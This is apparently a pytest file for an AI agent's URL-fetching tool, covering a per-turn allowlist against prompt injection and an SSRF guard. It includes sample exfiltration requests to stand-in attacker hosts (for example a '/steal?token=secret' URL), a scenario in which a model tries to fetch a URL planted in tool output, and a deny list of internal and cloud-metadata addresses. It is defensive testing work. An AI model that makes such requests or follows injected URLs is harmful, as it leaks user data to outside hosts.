"""Tests for fetch_url_tool per-turn URL allowlist (prompt scoping + runtime enforcement)."""

import socket
from datetime import datetime, timezone
from unittest.mock import AsyncMock, patch
from urllib.parse import urlparse

import pytest
from langchain_core.runnables import RunnableConfig

from models.chat import Message, MessageSender, MessageType
from utils.retrieval.agentic import (
    AGENT_SAFETY_INSTRUCTIONS,
    _inject_user_url_allowlist,
)
from utils.retrieval.tools.web_tools import (
    URL_NOT_ALLOWLISTED_MESSAGE,
    _is_disallowed_ip,
    _resolve_public_ip,
    extract_urls_from_text,
    extract_user_turn_urls,
    fetch_url_tool,
    is_redirect_url_allowlisted,
    is_url_allowlisted,
    user_url_allowlist_block,
)


def _message(text: str, sender: MessageSender = MessageSender.human) -> Message:
    return Message(
        id='m1',
        text=text,
        created_at=datetime.now(timezone.utc),
        sender=sender,
        type=MessageType.text,
    )


class TestUrlExtraction:
    def test_extracts_urls_from_user_message(self):
        urls = extract_urls_from_text('Check https://example.com/article and http://foo.bar/baz.')
        assert urls == ['https://example.com/article', 'http://foo.bar/baz']

    def test_strips_trailing_punctuation(self):
        urls = extract_urls_from_text('See https://example.com/page, thanks!')
        assert urls == ['https://example.com/page']

    def test_preserves_balanced_parentheses(self):
        urls = extract_urls_from_text('See https://en.wikipedia.org/wiki/Function_(mathematics).')
        assert urls == ['https://en.wikipedia.org/wiki/Function_(mathematics)']

    def test_returns_all_urls_for_overflow_detection(self):
        text = ' '.join(f'https://example.com/{index}' for index in range(11))
        assert len(extract_urls_from_text(text)) == 11

    def test_extract_user_turn_urls_ignores_assistant_messages(self):
        messages = [
            _message('Old https://old.example.com/page'),
            _message('Reply with https://attacker.example.com/exfil', MessageSender.ai),
            _message('Summarize https://user.example.com/doc'),
        ]
        assert extract_user_turn_urls(messages) == ['https://user.example.com/doc']

    def test_extract_user_turn_urls_strips_sentence_terminal_punctuation(self):
        messages = [_message('Summarize https://example.com/article.')]
        assert extract_user_turn_urls(messages) == ['https://example.com/article']

    def test_extract_user_turn_urls_preserves_terminal_url_punctuation_in_explicit_delimiters(self):
        messages = [_message('Fetch <https://example.com/releases/v1.0.>')]
        assert extract_user_turn_urls(messages) == ['https://example.com/releases/v1.0.']

    def test_extract_user_turn_urls_preserves_terminal_url_punctuation_in_parentheses(self):
        messages = [_message('Fetch (https://example.com/releases/v1.0.)')]
        assert extract_user_turn_urls(messages) == ['https://example.com/releases/v1.0.']

    def test_extract_user_turn_urls_strips_unwrapped_sentence_punctuation(self):
        messages = [_message('Fetch https://example.com/article.!?')]
        assert extract_user_turn_urls(messages) == ['https://example.com/article']

    def test_extract_user_turn_urls_preserves_all_terminal_url_punctuation_in_backticks(self):
        messages = [_message('Fetch `https://example.com/releases/v1.0.!?`')]
        assert extract_user_turn_urls(messages) == ['https://example.com/releases/v1.0.!?']

    def test_extract_user_turn_urls_strips_closing_markdown_delimiters(self):
        messages = [_message('Fetch **https://example.com/article** and [https://example.com/docs]')]
        assert extract_user_turn_urls(messages) == ['https://example.com/article', 'https://example.com/docs']

    def test_extract_user_turn_urls_preserves_terminal_url_punctuation_in_markdown_delimiters(self):
        messages = [_message('Fetch **https://example.com/releases/v1.0.** and [https://example.com/releases/v2.0.?]')]
        assert extract_user_turn_urls(messages) == [
            'https://example.com/releases/v1.0.',
            'https://example.com/releases/v2.0.?',
        ]

    def test_extract_user_turn_urls_strips_closing_markdown_delimiters_before_sentence_punctuation(self):
        messages = [_message('Fetch **https://example.com/article**. and [https://example.com/docs].')]
        assert extract_user_turn_urls(messages) == ['https://example.com/article', 'https://example.com/docs']

    def test_extracted_terminal_url_punctuation_matches_literal_allowlist(self):
        url = extract_user_turn_urls([_message('Fetch <https://example.com/releases/v1.0.>')])[0]
        assert is_url_allowlisted(url, [url])

    def test_extract_user_turn_urls_bounds_overflow_scan(self):
        messages = [_message(' '.join(f'https://example.com/{index}' for index in range(1000)))]
        assert len(extract_user_turn_urls(messages, max_urls=11)) == 11

    def test_user_url_allowlist_block_empty_when_no_urls(self):
        assert user_url_allowlist_block([]) == ''

    def test_user_url_allowlist_block_lists_urls(self):
        block = user_url_allowlist_block(['https://example.com/a'])
        assert '<user_provided_urls>' in block
        assert 'https://example.com/a' in block


class TestPromptScoping:
    def test_agent_safety_instructions_forbid_unscoped_fetch(self):
        assert 'fetch_url_tool must not be used' in AGENT_SAFETY_INSTRUCTIONS
        assert '<user_provided_urls>' in AGENT_SAFETY_INSTRUCTIONS
        assert 'tool results' in AGENT_SAFETY_INSTRUCTIONS

    def test_agent_safety_instructions_carry_no_exception_the_runtime_cannot_honor(self):
        """is_url_allowlisted admits only URLs typed in the current turn, so the prompt must not
        promise that a user request can unlock a URL that came from retrieved data."""
        assert 'unless the user explicitly asks' not in AGENT_SAFETY_INSTRUCTIONS
        assert not is_url_allowlisted('https://retrieved.example.com/link', [])

    def test_inject_user_url_allowlist_prepends_to_latest_user_turn(self):
        messages = [{'role': 'user', 'content': 'hello https://example.com'}]
        updated = _inject_user_url_allowlist(messages, ['https://example.com'])
        assert '<user_provided_urls>' in updated[0]['content']
        assert 'https://example.com' in updated[0]['content']

    def test_inject_user_url_allowlist_skips_when_empty(self):
        messages = [{'role': 'user', 'content': 'hello'}]
        assert _inject_user_url_allowlist(messages, []) == messages


class TestRuntimeEnforcement:
    @pytest.mark.asyncio
    async def test_rejects_url_not_in_allowlist(self):
        config = RunnableConfig(configurable={'user_provided_urls': ['https://allowed.example.com']})
        result = await fetch_url_tool.ainvoke(
            {'url': 'https://attacker.example.com/steal?token=secret'},
            config=config,
        )
        assert result == URL_NOT_ALLOWLISTED_MESSAGE

    @pytest.mark.asyncio
    async def test_rejects_attacker_url_from_tool_result_scenario(self):
        """Simulate model trying to fetch a URL embedded in untrusted tool output."""
        user_url = 'https://user.example.com/article'
        attacker_url = 'https://attacker.example.com/exfil?data=leaked'
        config = RunnableConfig(configurable={'user_provided_urls': [user_url]})

        with patch('utils.retrieval.tools.web_tools._fetch_page', new_callable=AsyncMock) as mock_fetch:
            result = await fetch_url_tool.ainvoke({'url': attacker_url}, config=config)

        assert result == URL_NOT_ALLOWLISTED_MESSAGE
        mock_fetch.assert_not_called()

    @pytest.mark.asyncio
    async def test_rejects_when_allowlist_empty(self):
        config = RunnableConfig(configurable={'user_provided_urls': []})
        result = await fetch_url_tool.ainvoke({'url': 'https://example.com'}, config=config)
        assert result == URL_NOT_ALLOWLISTED_MESSAGE

    @pytest.mark.asyncio
    async def test_rejects_when_allowlist_missing(self):
        result = await fetch_url_tool.ainvoke({'url': 'https://example.com'})
        assert result == URL_NOT_ALLOWLISTED_MESSAGE

    @pytest.mark.asyncio
    async def test_allows_allowlisted_url(self):
        allowed = 'https://example.com/page'
        config = RunnableConfig(configurable={'user_provided_urls': [allowed]})

        with patch(
            'utils.retrieval.tools.web_tools._fetch_page',
            new_callable=AsyncMock,
            return_value=(200, 'text/html', '<html><body><p>Hello</p></body></html>'),
        ) as mock_fetch:
            result = await fetch_url_tool.ainvoke({'url': allowed}, config=config)

        assert mock_fetch.await_args.args[0] == allowed
        assert 'Content from' in result
        assert 'Hello' in result

    @pytest.mark.asyncio
    async def test_malformed_url_returns_a_bounded_error_instead_of_raising(self):
        malformed = 'https://['
        config = RunnableConfig(configurable={'user_provided_urls': [malformed]})

        with patch('utils.retrieval.tools.web_tools._fetch_page', new_callable=AsyncMock) as mock_fetch:
            result = await fetch_url_tool.ainvoke({'url': malformed}, config=config)

        assert result.startswith('Error:')
        mock_fetch.assert_not_called()

    @pytest.mark.asyncio
    async def test_malformed_allowlist_entry_does_not_abort_a_valid_fetch(self):
        allowed = 'https://example.com/page'
        config = RunnableConfig(configurable={'user_provided_urls': ['https://[', allowed]})

        with patch(
            'utils.retrieval.tools.web_tools._fetch_page',
            new_callable=AsyncMock,
            return_value=(200, 'text/html', '<html><body><p>Hello</p></body></html>'),
        ) as mock_fetch:
            result = await fetch_url_tool.ainvoke({'url': allowed}, config=config)

        assert mock_fetch.await_args.args[0] == allowed
        assert 'Hello' in result

    @pytest.mark.asyncio
    async def test_outbound_url_keeps_the_allowlisted_empty_query_delimiter(self):
        allowed = 'https://example.com/path?'
        config = RunnableConfig(configurable={'user_provided_urls': [allowed]})

        with patch(
            'utils.retrieval.tools.web_tools._fetch_page',
            new_callable=AsyncMock,
            return_value=(200, 'text/html', '<html><body><p>Hello</p></body></html>'),
        ) as mock_fetch:
            await fetch_url_tool.ainvoke({'url': allowed}, config=config)

        assert mock_fetch.await_args.args[0] == allowed

    @pytest.mark.asyncio
    async def test_outbound_url_lowercases_only_the_scheme(self):
        allowed = 'HTTPS://example.com/Path?A=B#Frag'
        config = RunnableConfig(configurable={'user_provided_urls': [allowed]})

        with patch(
            'utils.retrieval.tools.web_tools._fetch_page',
            new_callable=AsyncMock,
            return_value=(200, 'text/html', '<html><body><p>Hello</p></body></html>'),
        ) as mock_fetch:
            await fetch_url_tool.ainvoke({'url': allowed}, config=config)

        assert mock_fetch.await_args.args[0] == 'https://example.com/Path?A=B#Frag'

    def test_is_url_allowlisted_rejects_outbound_trailing_punctuation(self):
        allowlist = ['https://example.com/page']
        assert not is_url_allowlisted('https://example.com/page.', allowlist)

    def test_is_url_allowlisted_accepts_literal_terminal_punctuation(self):
        allowlist = ['https://example.com/releases/v1.0.']
        assert is_url_allowlisted('https://example.com/releases/v1.0.', allowlist)

    def test_is_url_allowlisted_rejects_unlisted_path_parameters(self):
        allowlist = ['https://example.com/page']
        assert not is_url_allowlisted('https://example.com/page;secret', allowlist)

    def test_is_url_allowlisted_canonicalizes_host_and_default_port(self):
        allowlist = ['HTTPS://Example.COM:443/page']
        assert is_url_allowlisted('https://example.com/page', allowlist)

    def test_is_url_allowlisted_distinguishes_trailing_dot_hostname(self):
        assert not is_url_allowlisted('https://example.com/page', ['https://example.com./page'])
        assert is_url_allowlisted('https://example.com./page', ['https://example.com./page'])

    def test_is_url_allowlisted_rejects_unlisted_same_host_variants(self):
        allowlist = ['http://example.com/page']
        assert not is_url_allowlisted('https://example.com/page/', allowlist)
        assert not is_url_allowlisted('https://www.example.com/canonical', allowlist)
        assert not is_url_allowlisted('https://Example.COM/other', allowlist)
        assert not is_url_allowlisted('https://other.example/page', allowlist)

    def test_is_redirect_url_allowlisted_rejects_unlisted_same_host_variants(self):
        allowlist = ['http://example.com/page']
        assert not is_redirect_url_allowlisted('https://example.com/page/', allowlist)
        assert not is_redirect_url_allowlisted('https://www.example.com/canonical', allowlist)
        assert not is_redirect_url_allowlisted('https://other.example/page', allowlist)

    def test_is_redirect_url_allowlisted_allows_same_origin_canonical_redirect(self):
        allowlist = ['https://Example.COM:443/short']
        assert is_redirect_url_allowlisted('https://example.com/full', allowlist)

    @pytest.mark.asyncio
    async def test_rejects_same_host_variant_of_allowlisted_url(self):
        allowlist_url = 'http://example.com/page'
        fetch_url = 'https://www.example.com/canonical'
        config = RunnableConfig(configurable={'user_provided_urls': [allowlist_url]})

        with patch(
            'utils.retrieval.tools.web_tools._fetch_page',
            new_callable=AsyncMock,
            return_value=(200, 'text/html', '<html><body><p>Hello</p></body></html>'),
        ) as mock_fetch:
            result = await fetch_url_tool.ainvoke({'url': fetch_url}, config=config)

        mock_fetch.assert_not_called()
        assert result == URL_NOT_ALLOWLISTED_MESSAGE

    @pytest.mark.asyncio
    async def test_rejects_redirect_to_non_allowlisted_url(self):
        """Redirect targets must stay on an allowlisted host."""
        allowed = 'https://trusted.example/short'
        config = RunnableConfig(configurable={'user_provided_urls': [allowed]})

        class _FakeResponse:
            def __init__(self):
                self.status_code = 302
                self.headers = {'location': 'https://other.example/malicious'}

            async def aiter_bytes(self, chunk_size=8192):
                if False:
                    yield b''

            async def __aenter__(self):
                return self

            async def __aexit__(self, *args):
                return False

        class _FakeClient:
            def __init__(self):
                self.urls = []

            def stream(self, method, url, **kwargs):
                self.urls.append(url)
                return _FakeResponse()

        client = _FakeClient()
        with (
            patch('utils.retrieval.tools.web_tools.get_web_fetch_client', return_value=client),
            patch(
                'utils.retrieval.tools.web_tools._resolve_public_ip',
                new_callable=AsyncMock,
                return_value='93.184.216.34',
            ),
        ):
            result = await fetch_url_tool.ainvoke({'url': allowed}, config=config)

        assert 'Redirect target is not in the current-turn user allowlist' in result
        assert client.urls == ['https://93.184.216.34/short']

    @pytest.mark.asyncio
    async def test_allows_redirect_to_allowlisted_url(self):
        start = 'https://trusted.example/short'
        target = 'https://trusted.example/full'
        config = RunnableConfig(configurable={'user_provided_urls': [start, target]})

        class _FakeResponse:
            def __init__(self, status_code, headers=None, body=b''):
                self.status_code = status_code
                self.headers = headers or {}
                self._body = body

            async def aiter_bytes(self, chunk_size=8192):
                if self._body:
                    yield self._body

            async def __aenter__(self):
                return self

            async def __aexit__(self, *args):
                return False

        class _FakeClient:
            def __init__(self):
                self.urls = []
                self._responses = [
                    _FakeResponse(302, headers={'location': target}),
                    _FakeResponse(200, headers={'content-type': 'text/html'}, body=b'<p>Hello</p>'),
                ]

            def stream(self, method, url, **kwargs):
                self.urls.append(url)
                return self._responses.pop(0)

        client = _FakeClient()
        with (
            patch('utils.retrieval.tools.web_tools.get_web_fetch_client', return_value=client),
            patch(
                'utils.retrieval.tools.web_tools._resolve_public_ip',
                new_callable=AsyncMock,
                return_value='93.184.216.34',
            ),
        ):
            result = await fetch_url_tool.ainvoke({'url': start}, config=config)

        assert client.urls == [
            'https://93.184.216.34/short',
            'https://93.184.216.34/full',
        ]
        assert 'Content from' in result
        assert 'Hello' in result


# Destinations that are not globally routable unicast. Each must fail closed at the
# egress guard; the hand-written private-range denylist let most of these through.
NON_GLOBAL_DESTINATIONS = [
    '0.0.0.0',
    '255.255.255.255',
    '198.18.0.1',
    '224.0.0.1',
    '192.0.2.1',
    '203.0.113.9',
    '240.0.0.1',
    '127.0.0.1',
    '169.254.169.254',
    '10.0.0.1',
    '172.16.0.1',
    '192.168.1.1',
    '100.64.0.1',
    '::',
    '::1',
    'ff02::1',
    'fe80::1',
    'fc00::1',
    '2001:db8::1',
    '::ffff:127.0.0.1',
    '::ffff:169.254.169.254',
]

GLOBAL_DESTINATIONS = ['8.8.8.8', '93.184.216.34', '2606:4700:4700::1111']


def _fake_getaddrinfo(address: str):
    family = socket.AF_INET6 if ':' in address else socket.AF_INET
    sockaddr = (address, 0, 0, 0) if family == socket.AF_INET6 else (address, 0)

    def _resolver(host, port, *args, **kwargs):
        return [(family, socket.SOCK_STREAM, socket.IPPROTO_TCP, '', sockaddr)]

    return _resolver


class _RecordingClient:
    """Stand-in HTTP client that records any request the guard failed to stop."""

    def __init__(self):
        self.urls = []

    def stream(self, method, url, **kwargs):
        self.urls.append(url)
        raise AssertionError(f'egress guard allowed a request to {url}')


class TestEgressAddressBounds:
    @pytest.mark.parametrize('address', NON_GLOBAL_DESTINATIONS)
    def test_non_global_addresses_are_blocked(self, address):
        assert _is_disallowed_ip(address) is True

    @pytest.mark.parametrize('address', GLOBAL_DESTINATIONS)
    def test_global_addresses_are_allowed(self, address):
        assert _is_disallowed_ip(address) is False

    def test_unparseable_address_is_blocked(self):
        assert _is_disallowed_ip('not-an-ip') is True

    @pytest.mark.asyncio
    @pytest.mark.parametrize('address', NON_GLOBAL_DESTINATIONS)
    async def test_hostname_resolving_to_non_global_address_is_not_public(self, address):
        with patch.object(socket, 'getaddrinfo', _fake_getaddrinfo(address)):
            assert await _resolve_public_ip('reserved.example') is None

    @pytest.mark.asyncio
    @pytest.mark.parametrize('address', ['0.0.0.0', '198.18.0.1', '224.0.0.1', '255.255.255.255', '::', 'ff02::1'])
    async def test_fetch_url_tool_refuses_reserved_destination_without_issuing_request(self, address):
        """An allowlisted URL whose host resolves to a reserved address must never be fetched."""
        url = 'https://reserved.example/page'
        config = RunnableConfig(configurable={'user_provided_urls': [url]})
        client = _RecordingClient()

        with (
            patch('utils.retrieval.tools.web_tools.get_web_fetch_client', return_value=client),
            patch.object(socket, 'getaddrinfo', _fake_getaddrinfo(address)),
        ):
            result = await fetch_url_tool.ainvoke({'url': url}, config=config)

        assert client.urls == []
        assert 'private or reserved address' in result

    @pytest.mark.asyncio
    async def test_redirect_to_reserved_destination_is_blocked_before_second_request(self):
        """A same-host redirect passes the allowlist but must still fail the address guard."""
        start = 'https://trusted.example/short'
        target = 'https://trusted.example/internal'
        config = RunnableConfig(configurable={'user_provided_urls': [start]})

        class _FakeResponse:
            def __init__(self):
                self.status_code = 302
                self.headers = {'location': target}

            async def aiter_bytes(self, chunk_size=8192):
                if False:
                    yield b''

            async def __aenter__(self):
                return self

            async def __aexit__(self, *args):
                return False

        class _FakeClient:
            def __init__(self):
                self.urls = []

            def stream(self, method, url, **kwargs):
                self.urls.append(url)
                return _FakeResponse()

        client = _FakeClient()
        resolved = iter(['93.184.216.34', '169.254.169.254'])

        def _resolver(host, port, *args, **kwargs):
            return [(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, '', (next(resolved), 0))]

        with (
            patch('utils.retrieval.tools.web_tools.get_web_fetch_client', return_value=client),
            patch.object(socket, 'getaddrinfo', _resolver),
        ):
            result = await fetch_url_tool.ainvoke({'url': start}, config=config)

        assert client.urls == ['https://93.184.216.34/short']
        assert 'private or reserved address' in result

    @pytest.mark.asyncio
    async def test_redirect_with_mixed_case_scheme_is_accepted(self):
        """A Location header may spell the scheme in any case; the redirect
        target must be accepted case-insensitively like the entry-point URL.
        Regression: `Http://...` after urljoin failed the lowercase startswith
        check and aborted the fetch of a valid, user-allowlisted redirect."""
        start = 'https://trusted.example/short'
        target = 'Http://trusted.example/full'
        config = RunnableConfig(configurable={'user_provided_urls': [start, target]})

        class _FakeResponse:
            def __init__(self, status_code, location=None):
                self.status_code = status_code
                self.headers = {'location': location} if location else {'content-type': 'text/html'}
                self._body = b'<p>Landed</p>'

            async def aiter_bytes(self, chunk_size=8192):
                yield self._body

            async def __aenter__(self):
                return self

            async def __aexit__(self, *args):
                return False

        class _FakeClient:
            def __init__(self):
                self.urls = []

            def stream(self, method, url, **kwargs):
                self.urls.append(url)
                if len(self.urls) == 1:
                    return _FakeResponse(302, location=target)
                return _FakeResponse(200)

        client = _FakeClient()
        with (
            patch('utils.retrieval.tools.web_tools.get_web_fetch_client', return_value=client),
            patch.object(socket, 'getaddrinfo', _fake_getaddrinfo('93.184.216.34')),
        ):
            result = await fetch_url_tool.ainvoke({'url': start}, config=config)

        assert 'Landed' in result
        assert client.urls == ['https://93.184.216.34/short', 'http://93.184.216.34/full']

    @pytest.mark.asyncio
    async def test_fetch_connects_to_pinned_ip_not_re_resolved_hostname(self):
        """The guard's resolved public IP must be the only lookup: the HTTP
        client receives the pinned IP (with the original hostname only as Host
        header/SNI), so a request-time re-resolution cannot be redirected to a
        private address. Regression: the guard returned a public IP for the
        hostname, but a second lookup at connect time would hit the cloud
        metadata address 169.254.169.254.
        """
        url = 'https://trusted.example/article'
        config = RunnableConfig(configurable={'user_provided_urls': [url]})

        class _FakeResponse:
            def __init__(self):
                self.status_code = 200
                self.headers = {'content-type': 'text/html'}
                self._body = b'<p>Hello</p>'

            async def aiter_bytes(self, chunk_size=8192):
                yield self._body

            async def __aenter__(self):
                return self

            async def __aexit__(self, *args):
                return False

        class _MetadataRebindClient:
            """A client that would reach 169.254.169.254 if it re-resolved the
            hostname at connect time. It must instead be handed the pinned IP."""

            def __init__(self):
                self.urls = []
                self.last_kwargs = None

            def stream(self, method, url, **kwargs):
                self.urls.append(url)
                self.last_kwargs = kwargs
                if urlparse(url).hostname == 'trusted.example':
                    raise AssertionError('client received the hostname and would re-resolve it to 169.254.169.254')
                return _FakeResponse()

        client = _MetadataRebindClient()
        with (
            patch('utils.retrieval.tools.web_tools.get_web_fetch_client', return_value=client),
            patch.object(socket, 'getaddrinfo', _fake_getaddrinfo('93.184.216.34')),
        ):
            result = await fetch_url_tool.ainvoke({'url': url}, config=config)

        assert client.urls == ['https://93.184.216.34/article']
        assert client.last_kwargs['headers']['Host'] == 'trusted.example'
        assert client.last_kwargs['extensions']['sni_hostname'] == 'trusted.example'
        assert 'Hello' in result


class TestModuleStubIsolation:
    def test_prompt_cache_stub_leaves_the_real_tool_decorator_installed(self):
        """The prompt-cache harness stubs langchain_core.tools at import time. When the real
        module is already loaded (as it is here, via web_tools), that stub must not replace the
        real @tool decorator, or every tool module imported afterwards exposes raw functions."""
        import importlib

        import langchain_core.tools as real_tools

        real_decorator = real_tools.tool
        importlib.import_module('tests.unit.test_prompt_cache_integration')

        assert real_tools.tool is real_decorator

        @real_tools.tool
        def _probe_tool(value: str) -> str:
            """Probe."""
            return value

        assert hasattr(_probe_tool, 'ainvoke')
